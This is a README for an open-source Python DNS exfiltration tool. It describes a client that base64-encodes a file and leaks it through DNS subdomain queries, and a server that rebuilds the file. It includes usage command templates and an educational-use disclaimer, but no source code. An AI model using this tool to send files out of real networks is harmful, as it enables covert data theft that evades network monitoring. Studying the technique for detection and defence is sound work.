# DNS Exfiltration Tool

## Overview
This project includes two main components: a DNS exfiltration client and a corresponding server. The client reads the contents of a file, encodes it using base64, and then exfiltrates the data over DNS queries to the server. The server listens for these queries, decodes the incoming data, and reconstructs the original file. This project is designed for educational purposes to demonstrate DNS exfiltration techniques.

## Components

### 1. Client (`client.py`)
The client script encodes and sends file data in chunks via DNS queries. Each query embeds data within the subdomain to be sent to the DNS server. 

#### Features:
- File encoding using base64
- Data transmission via DNS queries
- Use of unique identifiers for each session

### 2. Server (`server.py`)
The server script receives DNS queries, extracts and decodes the data, and reconstructs the original file.

#### Features:
- Listening for DNS queries on a specified port
- Decoding base64 encoded data from the queries
- File reconstruction and storage

## Installation

### Prerequisites
- Python 3.x
- `dnslib` library

### Setup
1. Clone the repository:
   ```bash
   git clone https://github.com/bufo333/python-dns-exfiltration-client-server.git
   ```
2. Install required Python packages:
   ```bash
   pip install dnslib
   ```

## Usage

### Running the Client
```bash
python client.py --file-path <path_to_file> --domain <domain_name> --server-ip <server_ip> --server-port <server_port>
```

### Running the Server
```bash
python server.py --port <listening_port> --output-dir <output_directory> --low <minimum latency per chunk> --high <maximum latency per chunk> --domain <domain needs to match client>
```

## License
This project is licensed under the GPL License - see the [LICENSE](LICENSE) file for details.

## Contributing
Contributions are welcome. Please fork the repository and submit a pull request.

## Authors
- John Burns

## Acknowledgments
This project was created for educational purposes to better understand DNS exfiltration techniques. 

## Disclaimer
The DNS Exfiltration Tool is developed for educational and research purposes only. It is intended to help users learn about and study DNS exfiltration techniques in a controlled, responsible, and legal environment.

This tool should not be used on any network, system, or domain without explicit permission from the rightful owners or administrators. Unauthorized use of this tool to perform DNS exfiltration or any other form of unauthorized data extraction could violate local, state, national, and international laws.

By downloading, copying, installing, or using the software, you agree to use it in a manner consistent with your local laws. The authors of this software disclaim all liability for any illegal use of this tool and any damages that may occur from its use. It is your responsibility to comply with all applicable laws and to use the software ethically and responsibly.

